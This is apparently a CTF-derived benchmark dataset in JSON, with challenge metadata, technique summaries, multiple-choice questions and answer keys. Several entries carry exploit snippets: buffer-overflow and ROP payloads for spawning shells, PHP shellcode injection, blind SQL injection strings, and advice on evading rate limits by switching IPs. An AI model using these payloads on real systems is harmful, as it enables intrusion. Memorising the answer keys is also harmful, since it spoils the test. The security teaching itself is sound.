            "In scenarios requiring interaction with a remote service for exploiting buffer overflow vulnerabilities, Python's `pwntools` library is an invaluable resource for crafting and sending payloads. It simplifies the process of connecting to remote services, crafting payloads (including packing of addresses in the correct format using functions like `p64()`), and parsing responses. This is especially useful for CTF challenges or pen-testing exercises targeting binaries susceptible to buffer overflow. To interact with a remote service and exploit a buffer overflow, the script structure generally includes creating a remote connection, sending the crafted payload, and handling the response to extract information like flags. Example script snippet: \n```\nfrom pwn import *\nhost, port = \"host1.metaproblems.com\", 5151\nr = remote(host, port)\nwin = 0x401172\nr.sendline(\"payload_here\") # Craft and send the payload here\nprint(r.recvall())\n```"
        ],
        "question": [
            "While exploiting a buffer overflow vulnerability using the `gets()` function, a programmer aims to execute a buffer overflow by passing a null byte right after a specific input. If the input buffer is designed to store \"Sup3rs3cr3tC0de\" followed by arbitrary data to overflow and overwrite the return address on the stack, which of the following best describes the reason and placement of the null byte in this scenario? - A. To indicate the end of the file, placed before \"Sup3rs3cr3tC0de\" - B. To signify the end of valid input, placed immediately after \"Sup3rs3cr3tC0de\" - C. To pad the buffer to its maximum size, placed at the beginning of the payload - D. To create an alignment for the return address, placed before the win function's address",
            "In a scenario where an attacker is preparing to exploit a buffer overflow vulnerability by interacting with a remote service, which Python library and its functions are most appropriate for crafting and sending a payload that includes overwriting the return address with a specific function's address and handling responses from the remote service? - A. `numpy`, using `np.array()` for payload creation and `np.connect()` for handling responses - B. `socket`, using `socket.create_connection()` for sending payloads and `socket.recv()` for responses - C. `requests`, using `requests.post()` for sending payloads and `requests.get()` for responses - D. `pwntools`, using `remote()` for creating a remote connection, `p64()` for packing addresses, and `recvall()` for handling responses"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Baffling Buffer 2",
        "write_up": "dataset/raw/Baffling Buffer 2.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2020",
            "https://ctftime.org/event/1106/tasks/"
        ],
        "score": 400,
        "max_score": 525,
        "difficulty": 0.7619047619047619,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities leveraging the `gets()` function, one can bypass various input validation mechanisms by including a null byte (`0x00`) within the payload. This is effective since `gets()` does not stop reading input at a null byte, unlike many string handling functions such as `fopen()` which consider a null byte as the end of the string. This discrepancy can be exploited to execute arbitrary code or control program flow by carefully crafting the input to overflow the buffer and manipulate the program's execution.\n   - Example payload part: `b\"/etc/passwd\\x00\" + cyclic(100)`",
            "For executing a remote code execution via a buffer overflow in a binary with NX (No eXecute) protection enabled, a Return Oriented Programming (ROP) chain can be used. Initially, libc base address can be leaked by crafting a payload that calls a libc function (e.g., `puts`) with a known GOT entry, enabling calculation of the base address with the offset. Following the address leakage, a ROP chain can include gadgets such as `pop rax; ret` to fulfill specific gadget constraints (like `rax` being NULL for certain one-gadget executions) before invoking a one-gadget or system call to spawn a shell. This approach leverages the static nature of binary addresses due to disabled PIE (Position Independent Executable) and the dynamic nature of libc addresses necessitating the leak.\n   - Example gadget setup for ROP chain: \n     ```python\n     pop_rax = libc.address + 0x000000000003a638  \n     one_gadget = libc.address + 0x4484f  \n     rc.raw(p64(pop_rax))  \n     rc.raw(p64(0x0))  \n     rc.raw(p64(one_gadget)) \n     ```"
        ],
        "question": [
            "In a binary exploitation challenge, consider exploiting a buffer overflow vulnerability where the problematic function is `gets()`. Given the behavior of `gets()`, which of the following techniques is effective for bypassing input validation mechanisms that treat a null byte (`0x00`) as the end of a string? - A. Prefixing the payload with a null byte to prevent `gets()` from reading further. - B. Including a null byte in the payload to exploit the difference in handling null bytes between `gets()` and functions like `fopen()`. - C. Using a sequence of null bytes to overflow the buffer beyond its limit. - D. Replacing all dangerous characters with null bytes to avoid detection.",
            "When exploiting a binary with NX enabled using a buffer overflow, which step is crucial for executing a Return Oriented Programming (ROP) chain that aims to spawn a shell? - A. Disabling NX at runtime to allow the execution of injected code. - B. Identifying a `pop <register>; ret` gadget to fulfill constraints for a subsequent system call. - C. Overwriting the return address with the address of a 'nop' slide. - D. Finding an executable stack region to place shellcode."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "bakflip&sons",
        "write_up": "dataset/raw/bakflip&sons.md",
        "type": "crypto",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 925,
        "max_score": 1000,
        "difficulty": 0.925,
        "knowledge": [
            "In cryptographic challenges involving an ECDSA signature oracle, it may be possible to manipulate the oracle's behavior to reveal portions of the secret key. By providing a bitmask, which affects the computation of the public key point (e.g., `secret ^ mask * G`), one can analyze the variations in the generated public keys to deduce the bits of the secret. Specifically, flipping a single bit in the secret (using the mask) and observing the change in the resultant public key allows one to deduce the original state of the flipped bit in the secret key.",
            "To systematically uncover the bits of a secret key bit-by-bit in challenges involving bit manipulation and ECDSA, use a strategy that involves sending modified requests to the oracle with varying bitmask lengths. Start with affecting the least significant bit (LSB) and progressively target more significant bits, while recovering portions of the secret key incrementally. This approach can be scaled to recover multiple bits at a time by leveraging known bits to minimize the search space, using masks to flip specific bits of interest, and comparing the outcomes with expected results based on ECC properties. \n\nExample strategy (Pseudocode snippet):\n```\nFor start_bit in range(0, secret_key_length, bits_at_once):\n    secret_mask = create_mask(bits_to_guess, start_bit)\n    signature = request_signature(message, secret_mask)\n    recovered = analyze_responses(signature, reference_points, bits_to_guess, start_bit)\n    print(\"Recovered secret chunk: \", recovered)\n```"
        ],
        "question": [
            "In the scenario of exploiting ECDSA signature oracles by applying bit masks, how does utilizing a mask that flips a single bit (e.g., `mask = 1`) aid in deducing the state of the least significant bit (LSB) of the secret key? - A. It doesn't affect the signature and hence the LSB cannot be deduced. - B. Flipping a bit alters the signature in a non-predictable manner, making it impossible to deduce the LSB. - C. By applying a mask that flips the LSB, one can compare the resulting public key with expected results (original `+ G` or `- G`) to determine the original state of the LSB. - D. It ensures that the LSB is always set to 1, therefore revealing its state directly. ",
            "When attempting to recover bits of a secret key in an ECDSA-based cryptographic challenge using bit masks and an oracle, which strategy is effective for systematically uncovering portions of the secret key, especially when the aim is to minimize the number of oracle interactions? - A. Always use a mask that flips all bits to ensure maximum information is obtained from each oracle interaction. - B. Start with the most significant bit and progress towards the least significant bit, using wide-ranging masks to cover the entire key space. - C. Target one bit at a time without using previously recovered bits to avoid information overlap and potential errors. - D. Use masks to target specific bits or bit ranges, starting from the least significant bits, recovering them chunk by chunk, and leveraging known bits to reduce the search space. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Base64 Encoder",
        "write_up": "dataset/raw/Base64 Encoder.md",
        "type": "reverse",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 656,
        "max_score": 906,
        "difficulty": 0.7240618101545254,
        "knowledge": [
            "When attempting to exploit a binary with base64 encoding vulnerabilities, especially when dealing with fixed memory mappings and buffer overflows, one effective strategy is to inject shellcode into a writable and executable region of memory. This can be facilitated by manipulating input data structures to store the shellcode in an area mapped with executable permissions. Specifically, in scenarios where a `key` or similar input is base64 encoded and mapped to a fixed, executable address, this region can be utilized to store and execute arbitrary code. The manipulation of the `key` field to include shellcode must be carefully calculated to ensure proper execution flow.\n    - Example preparation of shellcode for injection: \n      ```php\n      $key  = str_pad(\"T+F+N+S/X+e+R\", 0x20, \"/\");\n      $key .= pack(\"V\", 0x41414141);   // Padding\n      $key .= pack(\"V\", 0x41414141);   // More Padding\n      $key .= pack(\"V\", 0x41414141);   // Even More Padding\n      $key .= pack(\"V\", 0x77777030);   // Target PC (Program Counter) Address\n      $key .= file_get_contents(\"sc\"); // The shellcode itself loaded after the padding and PC address\n      ```",
            "Exploiting buffer overflows in web applications that process base64 encoded data can also be achieved by carefully crafting the size and content of input buffers. Specifically, when encoding with base64 increases the output size (4 bytes of output for every 3 bytes of input), creating a buffer that, when encoded, exceeds the allocated memory size can lead to buffer overflow vulnerabilities. This vulnerability can be exploited to overwrite saved registers or function return addresses, allowing for arbitrary code execution. The exploit requires precise control over the content and length of the user-supplied data to manipulate the program's execution flow successfully.\n    - Example of triggering a buffer overflow: \n      ```php\n      $buffer = pack(\"V\", 0x77777030); // Control the buffer to point to an executable address containing the shellcode\n      $clear  = decode($key, $buffer); // Decode operation used to manipulate buffer lengths and trigger the overflow\n      assert(3 === strlen($clear)); // Ensuring the decoded buffer has the expected length, part of controlling the exploit\n      $buffer  = str_repeat($clear, (249 + 12) / 2); // Crafting the payload to trigger overflow\n      ```"
        ],
        "question": [
            "When exploiting a binary to execute shellcode from a writable and executable memory region, which of the following correctly describes the process of preparing the `key` to include shellcode for execution? - A. Use `malloc` to allocate memory for the shellcode and then point `key` to this memory location. - B. Encode the shellcode in base64 and append it directly to the `cmd` parameter to bypass memory protections. - C. Pad the `key` with a specific sequence of bytes before appending the address pointing to the executable region, followed by the shellcode itself. - D. Directly insert the shellcode into the `buffer` parameter and expect the overflow to execute it. ",
            "In an attempt to exploit a buffer overflow vulnerability in a web application handling base64 encoding, which of the following approaches is correct for crafting the input to manipulate the application's execution flow? - A. Create a buffer that, when base64 encoded, perfectly matches the size of the allocated memory, avoiding any overflow. - B. Use an underflow technique by providing a smaller buffer than expected to bypass the memory allocation checks. - C. Carefully craft the `buffer` size and contents to ensure that, when encoded, it exceeds the allocated memory size, leading to a controlled overwrite of critical data or return addresses. - D. Fill the `cmd` parameter with a long string of null bytes to trigger an error in the memory allocation routine of the application. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Based",
        "write_up": "dataset/raw/Based.md",
        "type": "crypto",
        "competition": [
            "DigitalOverdose/2022",
            "https://ctftime.org/event/1623/tasks/"
        ],
        "score": 200,
        "max_score": 200,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges where encoded or ciphered text is given without specific instructions on what type of encoding or ciphering is used, one should consider common encoding schemes such as Base64 as a starting point. This approach is based on the assumption that strings ending with one or more '=' signs or containing characters from the Base64 character set might be Base64 encoded. To decode Base64 encoded data, the Linux command `cat <file> | base64 -d` can be used.\n   \nExample payload: `cat based.txt | base64 -d`",
            "When encountering a part of the challenge hinting towards the usage of classic ciphers or mentions keywords like \"city of ROT\" or any reference to rotation, explore using the ROT13 cipher for decoding, as it's one of the most common text rotation schemes. ROT13 is a specific case of the Caesar cipher and can be applied directly to strings to see if they reveal meaningful text. For decoding ROT13, online tools like [rot13.com](https://rot13.com) can be used or a script can be written to shift letters 13 positions in the alphabet.\n\nExample payload: Input the coded message into `https://rot13.com`"
        ],
        "question": [
            "In a cybersecurity CTF challenge, you are given a string that seems to be encoded but with no clear instructions on the encoding type used. The string ends with one or more '=' signs and includes characters like '+', '/', among letters and numbers. Which command would correctly decode this data if it is Base64 encoded?  - A. Use `cat <file> | base64` - B. Use `echo <string> | base64 -d` - C. Use `cat <file> | base64 -d` - D. Use `echo <string> | base64` ",
            "During a capture the flag (CTF) cybersecurity competition, a clue within the challenge mentions the \"city of ROT\". This hints at a potential encoding method used on a portion of the text. Knowing this, which tool or method would be most appropriate to decode the hinted portion of the encoded message?  - A. Use an MD5 hash decoder online. - B. Input the coded message into a XOR cipher decoder. - C. Run the segment through a Base64 decode command. - D. Input the coded message into `https://rot13.com` or a similar ROT13 decoding tool. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Bash history",
        "write_up": "dataset/raw/Bash history.md",
        "type": "forensics",
        "competition": [
            "SyskronSecurity/2020",
            "https://ctftime.org/event/1148/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "In tasks involving the analysis of bash history for forensics challenges, it is useful to filter out known benign commands to reduce noise and highlight potentially malicious activities using tools like `grep` with `-Ev` options for inverse matching. This approach allows for a more focused investigation on uncommon or suspicious commands which could suggest a compromise or malicious activity on the system.\n   - Example command to filter out noise: `grep -Ev '^(command1|command2)' file`",
            "Encoded commands in bash history files, especially those utilizing `base64` encoding, can be indicative of an attempt to obfuscate malicious commands. It's crucial to decode these commands to investigate their nature and intent. Additionally, if direct decoding results in errors or produces binary data, it suggests that multiple encodings may have been used, or additional manipulation like string concatenation might be necessary to reveal the payload.\n   - Example command to safely decode base64 without executing: `python -c 'from base64 import b64decode as decode; print(decode(\"BASE64_STRING\"))'`"
        ],
        "question": [
            "When analyzing bash history files in forensic challenges, which command can effectively reduce noise by excluding specified benign commands, thus highlighting potentially suspicious activities? - A. `grep -r '^(command1|command2)' file` - B. `grep -Ev '^(command1|command2)' file` - C. `sed 's/(command1|command2)//g' file` - D. `awk '/(command1|command2)/{print}' file` ",
            "How can you decode a suspicious encoded command in a bash history file without executing it, especially when you encounter troubles like incorrect padding errors or binary data? - A. `echo \"BASE64_STRING\" | base64 --decode` - B. `cat \"BASE64_STRING\" | base64 -D` - C. `python -c 'import base64; print(base64.b64encode(\"BASE64_STRING\"))'` - D. `python -c 'from base64 import b64decode as decode; print(decode(\"BASE64_STRING\"))'` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "BashD00r",
        "write_up": "dataset/raw/BashD00r.md",
        "type": "crypto",
        "competition": [
            "Aero/2021",
            "https://ctftime.org/event/1224/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with backdoored binaries, especially in CTF challenges, one approach to uncover hidden functionalities or triggers is meticulously comparing the binary's behavior or structure with its original source code if available. Noticing discrepancies in function calls, added or modified code segments, and unexpected functionalities not present in the standard version can lead to the discovery of the backdoor mechanism or trigger. Additionally, static and dynamic analysis tools like IDA, GDB, and custom scripting can be essential in reverse engineering these modifications to identify how to interact with the backdoor.",
            "For challenges involving cryptographic procedures embedded within the binary, understanding and reversing custom or known cryptographic implementations is crucial. If a Feistel cipher, Serpent encryption, or any cryptosystem is utilized within a challenge, recognizing the encryption process and its parameters allows for the decryption of potentially obfuscated or encrypted data crucial for progressing in the challenge. Replicating the encryption algorithm in a high-level language like Python can facilitate the decryption or further manipulation of data, aiding in extracting hidden information, keys, or flags embedded within the challenge. This approach involves careful analysis of the cryptographic function's operations, constants, and any related transformations applied to the input data."
        ],
        "question": [
            "In a CTF challenge involving a backdoored bash binary, exhaustively comparing the disassembled binary to the original bash source code reveals functions not present in the standard bash implementation. For example, an unexpected call to `getenv(\"JAKWEULOD\")` is identified, which does not exist in official bash source codes. In the context of backdoored binaries, which of the following best describes an effective method for uncovering hidden functionalities or triggers? - A. Deeply analyzing the binary with text editors and looking for human-readable strings only. - B. Solely relying on automated tools to flag differences without manual verification. - C. Methodically comparing the binary's behavior or structure with its original source code and using both static and dynamic analysis tools. - D. Ignoring added or modified code segments as they are unlikely to reveal any useful information about the backdoor mechanism. ",
            "In the same CTF challenge, the binary implements a custom cryptographic procedure that resembles a Feistel cipher for data transformation, critical to the challenge's progression. Understanding the implemented Feistel cipher involves recognizing the encryption or decryption process, and replication in a scripting language like Python is shown to facilitate the reversal or unlocking of encrypted data. In this scenario, which of the following steps is most crucial for handling cryptographic procedures embedded within a backdoored binary? - A. Assuming that all cryptographic implementations in the binary are secure and cannot be reversed. - B. Understanding and reversing the cryptographic implementation to decrypt or manipulate embedded data. - C. Focusing solely on the cryptographic constants and ignoring the algorithm's structure and data transformations. - D. Avoiding the use of high-level languages for replicating the algorithm, as it is considered ineffective. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Basic Rev",
        "write_up": "dataset/raw/Basic Rev.md",
        "type": "reverse",
        "competition": [
            "BYUCTF/2022",
            "https://ctftime.org/event/1660/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "For challenges requiring understanding or manipulation of binary programs, particularly when dealing with conditional branches (such as identifying correct inputs that lead to desired outcomes), symbolic execution frameworks like angr can be extremely effective. This approach facilitates the discovery of inputs that lead to specific states within the application, bypassing the need for manual reverse engineering of binary code to some extent. In the context of CTF challenges where the goal is to find a specific input or a series of inputs that lead to a successful condition (like printing a flag), leveraging such tools can save significant time and effort. Example usage includes defining symbolic variables for input, specifying start and goal states, and instructing the framework to explore paths between these states, avoiding undesired outcomes.",
            "In binary reversing or exploitation challenges, identifying \"good\" and \"bad\" paths based on program behavior (e.g., output messages like \"Wrong number!\" or \"Finished processing flag!\") can help in setting up conditions for symbolic execution tools like angr. This involves specifying addresses that represent failure or success states and configuring the symbolic execution engine to seek state transitions from the start state to the desired end state, thereby filtering out paths that lead to failure states. By defining these paths explicitly, the solver can more efficiently navigate through the binary's execution flow to find values (e.g., correct inputs) that satisfy the conditions leading to the success state, such as revealing a hidden flag."
        ],
        "question": [
            "In the context of using symbolic execution tools like angr for binary analysis, which step is crucial for beginning the analysis process correctly? - A. Compiling the source code with debugging symbols to enhance clarity. - B. Defining a 64-bit symbolic bit vector for input analysis purposes. - C. Ensuring that all external library dependencies are statically linked. - D. Decrypting the binary to plain text to simplify the analysis process.",
            "When utilizing symbolic execution frameworks like angr to solve binary reversing challenges, how is the determination of \"good\" and \"bad\" paths significant? - A. It ensures that the binary can only execute in a controlled environment. - B. It allows for the determination of the optimal compilation flags. - C. It provides a mechanism for filtering out undesirable execution paths, focusing analysis on reaching specific program states. - D. It enhances the symbolic execution engine's ability to predict runtime errors beforehand."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "beef-of-finitude",
        "write_up": "dataset/raw/beef-of-finitude.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities to overwrite a local variable and control the instruction pointer (IP), careful calculation of the offset is essential. For variables, identify their location relative to the buffer start, and for IP redirection, find the offset to the saved return address. This can be facilitated by examining the vulnerable function's stack setup, considering both buffer sizes and local variable allocations. In this context, two separate buffers (`first_buffer` and `second_buffer`) and a target variable (`var_to_change`) were identified. The first step involved overflowing `second_buffer` to overwrite `var_to_change` with a specific value (`0xdeadbeef`), then adjusting the IP to execute a desired function (`win`).",
            "In scenarios where specific parameter values must be set to bypass additional checks within a function redirected via overflow, a carefully crafted payload that includes not only the IP redirection but also the necessary parameters aligned as they would be on the stack for a function call is required. This involves appending the address of the function (`win`) to be executed, followed by the parameters it checks against (`param_1`, `param_2`, `param_3`, `param_4`), ensuring they are in the correct order and format to satisfy the conditional checks in the function. Example payload:\n\n```python\npad_1 = b\"A\" * OFFSET_TO_VAR  # OFFSET_TO_VAR is the distance from the buffer start to the variable to overwrite\npad_2 = b\"A\" * OFFSET_TO_IP  # OFFSET_TO_IP is the distance from the variable to the saved return address on stack\n\nstack_frame =  p32(0x08049236)  # Address of win function\nstack_frame += p32(0xSOME_EXIT_FUNC)  # Address of an exit function or similar to prevent crash after win executes\nstack_frame += p32(0x14b4da55)  # param_1 expected by win\nstack_frame += p32(0)  # param_2 expected by win\nstack_frame += p32(0x67616c66)  # param_3 expected by win\nstack_frame += p32(0)  # param_4 expected by win\n\npayload = pad_1 + p32(0xdeadbeef) + pad_2 + stack_frame\n```"
        ],
        "question": [
            "In a buffer overflow attack scenario, when attempting to overwrite a local variable and control the instruction pointer, what is the correct approach to calculate the required offsets? - A. Estimate the offsets visually based on the source code. - B. Use a debugger to step through each instruction and manually calculate the distance. - C. Determine the offsets by examining the stack setup in the vulnerable function, considering buffer sizes and local variable allocations. - D. Randomly adjust the payload size until the program behaves as expected.",
            "In the context of preparing a payload for a buffer overflow that involves redirecting execution flow to a specific function with additional parameter checks, how should the payload be structured? - A. Append the desired function's address at the beginning of the payload, followed by any data to fill up space until the parameters. - B. Start with random data to confuse the stack protection mechanisms, then insert the function address and parameters. - C. Insert the address of the function (`win`) to be executed into the payload, followed by the parameters (`param_1`, `param_2`, `param_3`, `param_4`), ensuring their order and format match the function's expectations. - D. Place a NOP sled at the start of the payload, followed by the parameters in reverse order, ending with the function's address."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Befuddled1",
        "write_up": "dataset/raw/Befuddled1.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with a programming challenge involving an esoteric language like Befunge, understanding the basic syntax and instructions of that language is crucial for manipulating the stack or control flow to achieve the desired outcome. Example payload for popping the stack and creating a loop in Befunge: `>,<`",
            "In challenges with character limits for code submission, exploring compact programming patterns or loops that fulfill the challenge requirements within the given constraints is essential. This involves using minimalistic code that leverages the language's features to interact with the data, in this case, the stack, efficiently."
        ],
        "question": [
            "In a programming challenge related to an esoteric language like Befunge, given the basic operation instructions `>`, `,`, and `<`, where `>` increments the program counter, `,` pops the stack, and `<` decrements the program counter, which combination effectively creates a loop that pops the stack? - A.`<,>` - B.`>,<` - C.`>><<` - D.`,><`",
            "When dealing with a programming challenge that imposes a character limit for submissions, particularly in a language designed for code compactness, which approach is beneficial for efficiently interacting with the stack? - A.Writing extensive functions to handle stack manipulation - B.Using verbose variable names for clarity - C.Utilizing minimalistic loops and operations that directly manipulate the stack - D.Implementing complex algorithms to ensure code elegance"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Befuddled2",
        "write_up": "dataset/raw/Befuddled2.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In Befunge programming challenges where the code execution direction is restricted, leveraging the \"_`\" (conditional horizontal movement based on stack value) and \"`.`\" (output top stack value as integer) instructions can effectively iterate through and reveal hidden or encoded information, such as ASCII values of a flag, within the given character limit constraints. Specifically, pushing numerical values onto the stack and using conditional logic to alter execution flow can circumvent limitations on direct program counter manipulation to iteratively reveal the flag.",
            "Understanding the behavior and utility of esoteric programming languages like Befunge is crucial for solving CTF challenges that involve code obfuscation or unconventional programming paradigms. Familiarity with the language's execution model (e.g., multi-dimensional instruction flow) and command set enables the crafting of concise programs that operate within restricted environments to extract or manipulate data, such as revealing hidden flags."
        ],
        "question": [
            "In a Befunge programming challenge with a 16 character limitation and restrictions on direct program counter manipulation, which Befunge instructions combination allows for the iterative output of ASCII values from the stack, assuming ASCII values are already placed on the stack? - A. `>@#*` - B. `v<^|` - C. `0_0..1_` - D. `>?!\\$`",
            "Regarding the solving of CTF challenges that involve unconventional programming languages like Befunge, which aspect is most critical for crafting effective solutions within constrained and obfuscated environments? - A. Memorizing the entire standard library of the language. - B. Understanding the language's unique execution model and instruction set. - C. Ability to write lengthy and complex algorithms. - D. Knowledge of compiling the language to machine code."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Beginner Rev",
        "write_up": "dataset/raw/Beginner Rev.md",
        "type": "The type of this challenge is **reverse**.",
        "competition": [
            "SwampCTF/2024",
            "https://ctftime.org/event/2138/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges related to reverse engineering where a static array of bytes is provided, and the program checks the input against a transformed version of this array, the transformation may involve a simple XOR operation. The key for the XOR operation can be identified through analyzing the program logic. In such cases, replicating the XOR logic in a scripting language like Python allows for the decryption of the hidden message.\n\n    Example Python code to perform XOR decryption:\n    ```python\n    def xor_string(input_string, key):\n        return ''.join(chr(ord(char) ^ key) for char in input_string)\n\n    characters = [ /* Array of characters from CTF challenge */ ]\n    xor_result = xor_string(''.join(characters), 0x41)  # 0x41 being the XOR key obtained from the challenge analysis.\n    print(\"XOR Result:\", xor_result)\n    ```",
            "In reverse engineering challenges that involve input validation through a series of character checks, the correct sequence to unlock or retrieve the hidden message (flag) can be retrieved by understanding the binary or program logic. This often involves reviewing conditional statements or loops that compare input characters against processed or obfuscated values within the binary.\n\n   This knowledge implies that the flag or key to solving the challenge can be directly derived by reversing the obfuscation logic applied to an array or string in the program. In scenarios where each character of the user\u2019s input is XORed with a constant value and then compared to values within the program, the solution involves reversing the XOR process with the same constant value used in the program."
        ],
        "question": [
            "In a reverse engineering challenge, you are given a static array of bytes and need to check the input against a transformed version of the array through an XOR operation. Given the following Python function used to undo the XOR operation on the array: ```python def xor_string(input_string, key): return ''.join(chr(ord(char) ^ key) for char in input_string) ``` If the XOR key used was 0x41, what Python line correctly represents how to transform the array back to its original form? - A. `xor_result = xor_string(''.join(byte_array), 0x42)` - B. `xor_result = xor_string(byte_array, 0x41)` - C. `xor_result = ''.join(chr(ord(char) ^ 0x41) for char in byte_array)` - D. `original_result = xor_string(''.join(byte_array), 0x41)` ",
            "In a cybersecurity challenge, a program checks user input against hard-coded values that have been obfuscated using a simple transformation. Specifically, each character in the input is XORed with the hexadecimal value 0x41 and then compared to values in a byte array within the binary. To reverse engineer and find the correct input, what approach should be taken based on understanding binary or program logic? - A. Apply a bitwise AND operation with the value 0x41 to each byte in the array. - B. Conduct a brute force attack with all possible byte values to find the correct sequence. - C. Reverse the XOR process by XORing each byte in the array with the value 0x41. - D. Increment each byte in the array by the decimal value 65 and compare it against the input. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Beginner's Crypto",
        "write_up": "dataset/raw/Beginner's Crypto.md",
        "type": "crypto",
        "competition": [
            "TSG/2021",
            "https://ctftime.org/event/1431/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with an encryption challenge involving modulo operations with large exponents, Euler's theorem can be a powerful tool for finding modular inverses, especially when direct inversion is not possible due to lack of coprime numbers. This approach can specifically be utilized in scenarios where the modulus is a power of a prime number, as demonstrated with $\\bmod5^{175}$. The theorem stipulates that $a^{\\varphi(n)} \\equiv 1 \\pmod{n}$ for $a$ and $n$ coprime, leading to the calculation of $(2^{10000})^{-1} \\bmod5^{175}$ by exponentiation to $\\varphi(5^{175}) - 1$. This method aids in decrypting or reversing modular exponentiation operations by finding the necessary modular inverse.",
            "For challenges that require manipulation of numbers in a specific modular space, simulating division by 2 (or any other factor inversely related to the multiplication operation in question) under modulus can be achieved through iterative conditional logic. This is particularly applicable when dealing directly with the modular form of a given calculation might lead to odd or even outcomes that affect the next operation in a predictable way. This is depicted through the logic of checking for evenness, then adjusting the modulus accordingly if odd, effectively 'dividing' the number by 2 within that modular space. This technique is useful for iteratively reversing a modular exponentiation where the direct inversion approach is not feasible or when dealing with conditions that significantly alter the approach, such as when the outcome needs to maintain congruence within a specific modulus.\n\nExample Payload:\n\n```python\ndef divide_by_two(x, mod): \n    if x % 2 == 0: \n        return x // 2 \n    else: \n        return (x + mod) // 2\n```"
        ],
        "question": [
            "In a certain cryptography challenge, you are given an encrypted message defined by the operation $c=\\text{flag} \\cdot 2^{10000} \\bmod 5^{175}$. To decrypt the message and find the flag, you decide to use Euler's theorem to calculate the modular inverse of $2^{10000}$ under $5^{175}$. Which of the following correctly represents the calculation of $(2^{10000})^{-1} \\bmod 5^{175}$ according to Euler's theorem? - A. $(2^{10000})^{5^{175}-1} \\bmod 5^{175}$ - B. $(2^{10000})^{\\varphi(5^{175})-1} \\bmod 5^{175}$ - C. $2^{\\varphi(5^{175})-10000} \\bmod 5^{175}$ - D. $(2^{10000})^{5^{175}} \\bmod 5^{175}$ ",
            "In a scenario where you need to reverse a modular exponentiation operation that multiplied a flag value by $2^{10000}$ under a modulus of $5^{175}$, you come across an innovative technique to simulate division by 2 in this modular space. The approach involves a function that checks if a number is even or odd and then correctly performs a 'division by 2' operation, taking into account the modulus. Based on the provided example payload, which of the following best represents how this division by 2 is simulated in the modular space of $5^{175}$? - A. If $x$ is even, then $x / 2$; if $x$ is odd, then $(x - 1) / 2$ - B. If $x$ is even, return $x / 2$; else, return $(x - mod) / 2$ - C. If $x$ is even, then $x / 2$; if $x$ is odd, then $x \\cdot 2 / mod$ - D. If $x$ is even, then return $x // 2$; else, return $(x + mod) // 2$ "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Beginner's Luck",
        "write_up": "dataset/raw/Beginner's Luck.md",
        "type": "web",
        "competition": [
            "Securinets/2019/Quals",
            "https://ctftime.org/event/769/tasks/"
        ],
        "score": 989,
        "max_score": 1000,
        "difficulty": 0.989,
        "knowledge": [
            "When encountering SQL injection vulnerabilities, especially in scenarios where the application's behavior changes based on the success or failure of the query (indicative of blind SQL injection), payloads can be crafted to extract data. This is possible by altering the query logic to return true when a guess is correct. A common technique involves using the `LIKE` operator with wildcards to guess the data one character at a time. \n\nExample payload for verifying a guess of a token's character: \n```\nval=' OR (ip='x.x.x.x' AND token LIKE 'A%') #\n```",
            "In scenarios where an application limits the number of attempts you can make (e.g., guessing a token or password) before either locking out the user or resetting the token, changing the client's IP address can be a strategy to bypass this limitation. This approach hinges on the server tracking attempts or sessions based on IP addresses, thereby enabling an attacker to continue guessing or brute-forcing data beyond the set attempt limit.\n\nNo specific payload example for changing IP addresses, as it involves changing the client's network configuration or using proxies/VPNs."
        ],
        "question": [
            "In the context of blind SQL injection, suppose you are trying to extract data by guessing one character of a secret token at a time. You are currently focusing on verifying if the first character of the token is 'A'. Which of the following payloads would correctly determine if your guess is accurate, given that the application outputs differently based on whether the query returns true or false?  - A. val=' OR '1'='1 - B. val='; DROP TABLE users; -- - C. val=' OR (ip='x.x.x.x' AND token LIKE 'A%') # - D. val=' AND 'x'='y ",
            "When dealing with an application that resets a token or locks an account after a certain number of failed attempts from the same IP address, what strategy can be employed to circumvent this security measure and continue the brute-force attack or guessing game without interruption?  - A. Use the same IP address but clear cookies for each request. - B. Change the User-Agent string in the HTTP request header. - C. Switch the client\u2019s IP address to resume attempts without triggering the limit. - D. Increase the delay between each guess to avoid detection. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Beginner's Misc",
        "write_up": "dataset/raw/Beginner's Misc.md",
